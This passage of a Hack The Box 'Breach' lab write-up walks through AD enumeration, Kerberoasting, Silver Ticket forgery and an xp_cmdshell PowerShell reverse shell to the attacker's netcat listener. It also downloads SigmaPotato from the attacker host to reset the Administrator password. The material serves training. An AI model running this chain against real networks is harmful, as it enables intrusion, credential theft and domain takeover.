  groupname: Cert Publishers                                                                                                                                                                                                                
  type: local                                                                                                                                                                                                                               
'518':                                                                                                                                                                                                                                      
  groupname: Schema Admins                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'519':                                                                                                                                                                                                                                      
  groupname: Enterprise Admins                                                                                                                                                                                                              
  type: domain                                                                                                                                                                                                                              
'520':                                                                                                                                                                                                                                      
  groupname: Group Policy Creator Owners                                                                                                                                                                                                    
  type: domain                                                                                                                                                                                                                              
'521':                                                                                                                                                                                                                                      
  groupname: Read-only Domain Controllers                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'522':                                                                                                                                                                                                                                      
  groupname: Cloneable Domain Controllers                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'525':                                                                                                                                                                                                                                      
  groupname: Protected Users                                                                                                                                                                                                                
  type: domain                                                                                                                                                                                                                              
'526':                                                                                                                                                                                                                                      
  groupname: Key Admins                                                                                                                                                                                                                     
  type: domain                                                                                                                                                                                                                              
'527':                                                                                                                                                                                                                                      
  groupname: Enterprise Key Admins                                                                                                                                                                                                          
  type: domain                                                                                                                                                                                                                              
'544':                                                                                                                                                                                                                                      
  groupname: Administrators                                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             
'545':                                                                                                                                                                                                                                      
  groupname: Users                                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'546':                                                                                                                                                                                                                                      
  groupname: Guests                                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'548':                                                                                                                                                                                                                                      
  groupname: Account Operators                                                                                                                                                                                                              
  type: builtin                                                                                                                                                                                                                             
'549':                                                                                                                                                                                                                                      
  groupname: Server Operators                                                                                                                                                                                                               
  type: builtin                                                                                                                                                                                                                             
'550':                                                                                                                                                                                                                                      
  groupname: Print Operators                                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'551':                                                                                                                                                                                                                                      
  groupname: Backup Operators                                                                                                                                                                                                               
  type: builtin                                                                                                                                                                                                                             
'552':                                                                                                                                                                                                                                      
  groupname: Replicator                                                                                                                                                                                                                     
  type: builtin                                                                                                                                                                                                                             
'553':                                                                                                                                                                                                                                      
  groupname: RAS and IAS Servers                                                                                                                                                                                                            
  type: local                                                                                                                                                                                                                               
'554':                                                                                                                                                                                                                                      
  groupname: Pre-Windows 2000 Compatible Access                                                                                                                                                                                             
  type: builtin                                                                                                                                                                                                                             
'555':                                                                                                                                                                                                                                      
  groupname: Remote Desktop Users                                                                                                                                                                                                           
  type: builtin                                                                                                                                                                                                                             
'556':                                                                                                                                                                                                                                      
  groupname: Network Configuration Operators                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'557':                                                                                                                                                                                                                                      
  groupname: Incoming Forest Trust Builders                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             
'558':                                                                                                                                                                                                                                      
  groupname: Performance Monitor Users                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'559':                                                                                                                                                                                                                                      
  groupname: Performance Log Users                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'560':                                                                                                                                                                                                                                      
  groupname: Windows Authorization Access Group                                                                                                                                                                                             
  type: builtin                                                                                                                                                                                                                             
'561':                                                                                                                                                                                                                                      
  groupname: Terminal Server License Servers                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'562':                                                                                                                                                                                                                                      
  groupname: Distributed COM Users                                                                                                                                                                                                          
  type: builtin                                                                                                                                                                                                                             
'568':                                                                                                                                                                                                                                      
  groupname: IIS_IUSRS                                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'569':                                                                                                                                                                                                                                      
  groupname: Cryptographic Operators                                                                                                                                                                                                        
  type: builtin                                                                                                                                                                                                                             
'571':                                                                                                                                                                                                                                      
  groupname: Allowed RODC Password Replication Group                                                                                                                                                                                        
  type: local                                                                                                                                                                                                                               
'572':                                                                                                                                                                                                                                      
  groupname: Denied RODC Password Replication Group                                                                                                                                                                                         
  type: local                                                                                                                                                                                                                               
'573':                                                                                                                                                                                                                                      
  groupname: Event Log Readers                                                                                                                                                                                                              
  type: builtin                                                                                                                                                                                                                             
'574':                                                                                                                                                                                                                                      
  groupname: Certificate Service DCOM Access                                                                                                                                                                                                
  type: builtin                                                                                                                                                                                                                             
'575':                                                                                                                                                                                                                                      
  groupname: RDS Remote Access Servers                                                                                                                                                                                                      
  type: builtin                                                                                                                                                                                                                             
'576':                                                                                                                                                                                                                                      
  groupname: RDS Endpoint Servers                                                                                                                                                                                                           
  type: builtin                                                                                                                                                                                                                             
'577':                                                                                                                                                                                                                                      
  groupname: RDS Management Servers                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'578':                                                                                                                                                                                                                                      
  groupname: Hyper-V Administrators                                                                                                                                                                                                         
  type: builtin                                                                                                                                                                                                                             
'579':                                                                                                                                                                                                                                      
  groupname: Access Control Assistance Operators                                                                                                                                                                                            
  type: builtin                                                                                                                                                                                                                             
'580':                                                                                                                                                                                                                                      
  groupname: Remote Management Users                                                                                                                                                                                                        
  type: builtin                                                                                                                                                                                                                             
'582':                                                                                                                                                                                                                                      
  groupname: Storage Replica Administrators                                                                                                                                                                                                 
  type: builtin                                                                                                                                                                                                                             

 ===================================
|    Shares via RPC on breach.vl    |
 ===================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:                                                                                                                                                                                                                                     
  comment: Remote Admin                                                                                                                                                                                                                     
  type: Disk                                                                                                                                                                                                                                
C$:                                                                                                                                                                                                                                         
  comment: Default share                                                                                                                                                                                                                    
  type: Disk                                                                                                                                                                                                                                
IPC$:                                                                                                                                                                                                                                       
  comment: Remote IPC                                                                                                                                                                                                                       
  type: IPC                                                                                                                                                                                                                                 
NETLOGON:                                                                                                                                                                                                                                   
  comment: Logon server share                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
SYSVOL:                                                                                                                                                                                                                                     
  comment: Logon server share                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
Users:                                                                                                                                                                                                                                      
  comment: ''                                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
share:                                                                                                                                                                                                                                      
  comment: ''                                                                                                                                                                                                                               
  type: Disk                                                                                                                                                                                                                                
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK
[*] Testing share share
[+] Mapping: OK, Listing: OK

 ======================================
|    Policies via RPC for breach.vl    |
 ======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                                                                                                                                                                                
  Password history length: 24                                                                                                                                                                                                               
  Minimum password length: 7                                                                                                                                                                                                                
  Maximum password age: 41 days 23 hours 53 minutes                                                                                                                                                                                         
  Password properties:                                                                                                                                                                                                                      
  - DOMAIN_PASSWORD_COMPLEX: true                                                                                                                                                                                                           
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                                                                                                                                                                   
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                                                                                                                                                                  
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                                                                                                                                                                   
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                                                                                                                                                         
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                                                                                                                                                           
Domain lockout information:                                                                                                                                                                                                                 
  Lockout observation window: 30 minutes                                                                                                                                                                                                    
  Lockout duration: 30 minutes                                                                                                                                                                                                              
  Lockout threshold: None                                                                                                                                                                                                                   
Domain logoff information:                                                                                                                                                                                                                  
  Force logoff time: not set                                                                                                                                                                                                                

 ======================================
|    Printers via RPC for breach.vl    |
 ======================================
[+] No printers available

Completed after 20.85 seconds
</code></pre>
</details>

Now we can see we have a lot more permissions. I'll take note of the users and groups, as well as other interesting information we could gather. I'll use bloodhound-python to collect the data to import it in bloodhound.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "breach.vl" -ns 10.129.8.90 -v -u julia.wong -p 'Computer1'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: dcom, loggedon, trusts, session, localadmin, objectprops, psremote, rdp, container, group, acl
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: breach.vl
....
```

SMB wise, I'll check with nxc again.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ nxc smb breach.vl -u julia.wong -p 'Computer1' --shares   
SMB         10.129.8.90     445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.8.90     445    BREACHDC         [+] breach.vl\julia.wong:Computer1 
SMB         10.129.8.90     445    BREACHDC         [*] Enumerated shares
SMB         10.129.8.90     445    BREACHDC         Share           Permissions     Remark
SMB         10.129.8.90     445    BREACHDC         -----           -----------     ------
SMB         10.129.8.90     445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.8.90     445    BREACHDC         C$                              Default share
SMB         10.129.8.90     445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.8.90     445    BREACHDC         NETLOGON        READ            Logon server share 
SMB         10.129.8.90     445    BREACHDC         share           READ,WRITE      
SMB         10.129.8.90     445    BREACHDC         SYSVOL          READ            Logon server share 
SMB         10.129.8.90     445    BREACHDC         Users           READ
```

If we go back a little, we had a directory under the name of julia.wong inside `"share"`, I'll check that out.

```bash
smb: \transfer\julia.wong\> ls
  .                                   D        0  Wed Apr 16 20:38:12 2025
  ..                                  D        0  Wed Feb 25 12:49:48 2026
  user.txt                            A       32  Wed Apr 16 20:38:22 2025

                7863807 blocks of size 4096. 1517795 blocks available
smb: \transfer\julia.wong\> 
```

The user.txt is there, we just have to get it and read it.

```bash
smb: \transfer\julia.wong\> get user.txt
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \transfer\julia.wong\> exit
```
```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ cat user.txt 
55d33e....
```

I'll move on to bloodhound now.

### Bloodhound

Looking at julia.wong profile, she doesn't have any interesting outbound permissions. I'll mark her as owned and enumerate the rest of the Active Directory environment.

<p align="center">
  <a href="/assets/images/breach/Captura2.png" class="glightbox">
    <img src="/assets/images/breach/Captura2.png" width="700">
  </a>
</p>

We'll go to the `"Analysis"` tab to use the pre-made queries in Bloodhound. A very interesting one is the Kerberoastable accounts.

<p align="center">
  <a href="/assets/images/breach/Captura3.png" class="glightbox">
    <img src="/assets/images/breach/Captura3.png" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/breach/Captura4.png" class="glightbox">
    <img src="/assets/images/breach/Captura4.png" width="700">
  </a>
</p>


This shows us svc_mssql has a SPN set, meaning it might be vulnerable to a kerberoast attack. To try and exploit this, we have a lot of options out there, using nxc or imapcket tools is always my go to.

### Kerberoasting

An SPN or `Service Principal Name` is basically a label in Active Directory that links a service (like SQL or a web server) to the account running it. Kerberos uses this information to know which account should decrypt the service ticket during authentication.

To perform a Kerberoast attack, we must first be authenticated in the domain, even as a low-privileged user. We then request a `service ticket` (TGS) for a given SPN. The Domain Controller returns a legitimate ticket that is encrypted using the service account’s key, which is derived from its password hash. Since any authenticated domain user is allowed to request service tickets, we can extract the encrypted portion and attempt to crack it offline. If the service account’s password is weak, this can result in recovering valid credentials for that account.

For this, I'll use impacket-GetUserSPNs with the `-request` flag.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/bh]
└─$ impacket-GetUserSPNs breach.vl/julia.wong:'Computer1' -dc-ip 10.129.8.90 -request 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106169  2026-02-25 11:26:17.783432             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$0a0859eb586316d1878faa9e527e5320$1a3e60a909843cedcc0052dbafb380bbad1379e20af878a4a88c4ce6e1872b78f2b271153496f2458ebdf6494efcfb294cf01dcd5902c97a899c065634c0e3775472e4cacfa6aefe7b3b7aaaf569f78a55582a19d67ffc105385565131cdd157da44dc73e933fdbcbc483111dfa3cef67298292e2d9802b31fdc28b947cdfcf04e54b341391a9e07686fc21f98a2d59a4549025955e18e7d8b8ab67a8248f2beb6102c078921a93ca6b3f87195470dd98844555af9a2297de384a81e8121db5891328857008680797661e1b0847d7aa2b0e1d0dfca210510edf27a0ece640f60e6d0af0e71ca7d5630359bb2023a87f9e3c0a3f5bcec2b977029a7652e6acfa97c5e87da1b09890ce4030823247f7863eec5d44360a036abe7b2efd0e0bacbec627ca07aa2a016b7d523e8542d16f1178ae3cdf29e5a9050bfcaa6998b9df1a602ca364844cea68308e3c4422670d97ffbf4df8261b7c036d32100ba76a38691290229659ed861da73dd9b7348131b3315c012c0978ff9e9fb387ee063721848996ed1dd9f3ac7e42bdb7c963f73409525bbfecc0a83cfd3d929740bb9b60ad8eb020ecef8d2958f5aeaf10ccd19a6b0d76959283698e964f95671b5073ff8b206ba2e56b61a8da3d3ed1427b50bb0d8990d8856c7af02ea2d9cf5ef0702f159e005b722aec74eea05924268ab60db0083d25c0f28ace9b4f16665bca3b6fc8f79ccfec8d0a2c3b19ac3cd1946ffa9c791cdb007b53d9fdc886d8ac5538832773e81b74f74a1b7d3018e4e9cc3b96bdd29340edab20f5f3f61b15ed2ea103a28eb5fdc0122e0b53c512976c3f33d0f5021812a8b2c165674c9d58a72df2985ff37eb53b52394adfbf9604eeb33f29bf6b074dd5dd8ef2ab499fb1fb1ecb8e167eb8e121f4aada0bb61abd0f08a3c09ef626fc5c93020671afbf8c0391bc9de95d227e75ad3d68d8779ff8bb65c9ad47a3936d08f7e55ef6e426ec119d2f0a10fa46b6e074433d742d058305a0446585b5b0ea08e7d25a67be43dc97656511da1cd8dbdc2a86d334c8368debfa2102e75723121a3ce18530014f1ecbe720dd91bc561ab0cffcae09b676641d6e6ade9099b816639773be7b3b32fdeb4ee6581d14059fef1161ca9a8c389e0271ed274f16457a3cd813be10f700427e51a1433a84d406b1e7a782b8c3bf540586d6d05ee7a1075cc34ef18711b1fb53b2572ee0bcfd85104baad5bc1d7c39c0dab2eea4671ccd869629ddef179e1ca8cec6f2599275a70c3b7ecdcf449b8c2bfff56ac26507c97784bd65d94c6f39a8da8cd4e11aba95d344566ff1eb2f944eda8b082f74f7a62bc8a463d6c13adb69f7378495847d489b99abe8c39e967f98e7a3890426a72a8aa66ae018a971137d8383ee53469c07d614f02e4acf7b407ce50143a4c114a17207a29fb9aee14267c662e6442822e3d29873bfb98395551f46ee2d23267412057
```

I'll copy the hash and try to crack it offline.

```powershell
Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$0a0859eb586316d1878faa9e527e5320$1a3e60a909843cedcc0052dbafb380bbad1379e20af878a4a88c4ce6e1872b78f2b271153496f2458ebdf6494efcfb294cf01dcd5902c97a899c065634c0e3775472e4cacfa6aefe7b3b7aaaf569f78a55582a19d67ffc105385565131cdd157da44dc73e933fdbcbc483111dfa3cef67298292e2d9802b31fdc28b947cdfcf04e54b341391a9e07686fc21f98a2d59a4549025955e18e7d8b8ab67a8248f2beb6102c078921a93ca6b3f87195470dd98844555af9a2297de384a81e8121db5891328857008680797661e1b0847d7aa2b0e1d0dfca210510edf27a0ece640f60e6d0af0e71ca7d5630359bb2023a87f9e3c0a3f5bcec2b977029a7652e6acfa97c5e87da1b09890ce4030823247f7863eec5d44360a036abe7b2efd0e0bacbec627ca07aa2a016b7d523e8542d16f1178ae3cdf29e5a9050bfcaa6998b9df1a602ca364844cea68308e3c4422670d97ffbf4df8261b7c036d32100ba76a38691290229659ed861da73dd9b7348131b3315c012c0978ff9e9fb387ee063721848996ed1dd9f3ac7e42bdb7c963f73409525bbfecc0a83cfd3d929740bb9b60ad8eb020ecef8d2958f5aeaf10ccd19a6b0d76959283698e964f95671b5073ff8b206ba2e56b61a8da3d3ed1427b50bb0d8990d8856c7af02ea2d9cf5ef0702f159e005b722aec74eea05924268ab60db0083d25c0f28ace9b4f16665bca3b6fc8f79ccfec8d0a2c3b19ac3cd1946ffa9c791cdb007b53d9fdc886d8ac5538832773e81b74f74a1b7d3018e4e9cc3b96bdd29340edab20f5f3f61b15ed2ea103a28eb5fdc0122e0b53c512976c3f33d0f5021812a8b2c165674c9d58a72df2985ff37eb53b52394adfbf9604eeb33f29bf6b074dd5dd8ef2ab499fb1fb1ecb8e167eb8e121f4aada0bb61abd0f08a3c09ef626fc5c93020671afbf8c0391bc9de95d227e75ad3d68d8779ff8bb65c9ad47a3936d08f7e55ef6e426ec119d2f0a10fa46b6e074433d742d058305a0446585b5b0ea08e7d25a67be43dc97656511da1cd8dbdc2a86d334c8368debfa2102e75723121a3ce18530014f1ecbe720dd91bc561ab0cffcae09b676641d6e6ade9099b816639773be7b3b32fdeb4ee6581d14059fef1161ca9a8c389e0271ed274f16457a3cd813be10f700427e51a1433a84d406b1e7a782b8c3bf540586d6d05ee7a1075cc34ef18711b1fb53b2572ee0bcfd85104baad5bc1d7c39c0dab2eea4671ccd869629ddef179e1ca8cec6f2599275a70c3b7ecdcf449b8c2bfff56ac26507c97784bd65d94c6f39a8da8cd4e11aba95d344566ff1eb2f944eda8b082f74f7a62bc8a463d6c13adb69f7378495847d489b99abe8c39e967f98e7a3890426a72a8aa66ae018a971137d8383ee53469c07d614f02e4acf7b407ce50143a4c114a17207a29fb9aee14267c662e6442822e3d29873bfb98395551f46ee2d23267412057:Trustno1
```

The hash easily cracks after some seconds and we now have achieved lateral movement.

### Shell as svc_mssql

With the new credentials, we'll check our permissions in bloodhound and marked it as owned.

<p align="center">
  <a href="/assets/images/breach/Captura5.png" class="glightbox">
    <img src="/assets/images/breach/Captura5.png" width="700">
  </a>
</p>

We don't have interesting `Outbuound permissions`, so I'll check port 1433 (mssql).

I'll use `impacket-mssqlclient` for this with the flag `-windows-auth` to specify we're using a domain account.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ impacket-mssqlclient svc_mssql@breach.vl -windows-auth                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query    
```

We can connect succesfully but we are mapped as the guest account which doesn't have useful privileges. I'll enumerate with the premade commands in impacket.

```bash
SQL (BREACH\svc_mssql  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
SQL (BREACH\svc_mssql  guest@master)> enum_links
SRV_NAME              SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE        SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-------------------   ----------------   -----------   -------------------   ------------------   ------------   -------   
BREACHDC\SQLEXPRESS   SQLNCLI            SQL Server    BREACHDC\SQLEXPRESS   NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (BREACH\svc_mssql  guest@master)> enum_logins
name            type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa              SQL_LOGIN                 1          1               0             0            0              0           0           0           0   
BUILTIN\Users   WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
SQL (BREACH\svc_mssql  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (BREACH\svc_mssql  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
guest                public     NULL        NULL        guest           b'2         '   b'00'   
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
sys                  public     NULL        NULL        NULL            b'4         '    NULL   
SQL (BREACH\svc_mssql  guest@master)> enu_owner
ERROR(BREACHDC\SQLEXPRESS): Line 1: Could not find stored procedure 'enu_owner'.
SQL (BREACH\svc_mssql  guest@master)> enum_owner
Database   Owner   
--------   -----   
master     sa      
tempdb     sa      
model      sa      
msdb       sa      
```

```bash
SQL (BREACH\svc_mssql  guest@master)> xp_dirtree C:
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
$WinREAgent                     1      0   
Boot                            1      0   
Documents and Settings          1      0   
EFI                             1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
share                           1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0   
````

So far nothing that could give us a shell. I can read directories in the machine, but that is as far as we can go.

### Silver Ticket attack

A `TGS (Ticket Granting Service ticket)` is essentially a Kerberos ticket that you present to a specific service in order to access it. If we possess the NTLM hash (or plaintext password) of the service account running that service, we know the key used to encrypt and validate service tickets. This means we can forge our own TGS, potentially including a user with higher privileges. If the service does not revalidate the ticket with the Domain Controller, it will accept the forged ticket and grant the privileges defined inside it.

Given into account that we now have the credentials of an account that owns a service and has a SPN set, we can perform a silver attack to try an elevate our privileges inside mssql.

To perform this, we'll use `ticketer` from the impacket tools. I'll leave this [link](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/) too which explains different types of tickets and how to perform attacks with them.

Following this [post](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver), we'll need the NTLM hash, domain SID and the SPN.

We already gathered the SPN and the domain SID from our enumeration before, so we'll just need the `NTLM hash`. For this, we'll use the plaintext password we obtained before and compute the NTLM from there. We can simply use [this](https://www.browserling.com/tools/ntlm-hash) page.

<p align="center">
  <a href="/assets/images/breach/Captura6.png" class="glightbox">
    <img src="/assets/images/breach/Captura6.png" width="700">
  </a>
</p>

The command runs succesfully and we have now a ticket as Administrator.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl Administrator 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

We'll export the ticket and use again impacket-mssqclient to use it.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ export KRB5CCNAME=Administrator.ccache                    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ impacket-mssqlclient -k -no-pass -windows-auth BREACHDC.breach.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> 
```

I can connect succesfully and as dbo, which means I have a lot more privileges than before. I'll try enabling xp_cmdshell now.

```bash
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Now we're able to run commands, I'll prompt for a base64 encoded reverse shell.

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd...."
```

I receive a response on netcat and we have a shell as svc_mssql.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.9.183] 52666

PS C:\Windows\system32> whoami
breach\svc_mssql
```

## Privilege escalation

### Shell as SYSTEM

I didn't have to look very deep for a way to escalate my current privileges. `/whoami all` shows interesting privileges.

```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name        SID                                          
================ =============================================
breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

With `SeImpersonatePrivilege` enabled, we can perform a Potato attack and gain shell as SYSTEM. I'll use SigmaPotato for this.

I'll transfer it from my kali machine and run `"net user"` to change the password of the user I desire, in this case, Administrator.

```bash
PS C:\Users\svc_mssql> iwr -uri http://10.10.14.16/SigmaPotato.exe -o SigmaPotato.exe
PS C:\Users\svc_mssql> .\SigmaPotato.exe "net user Administrator newpass00**"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
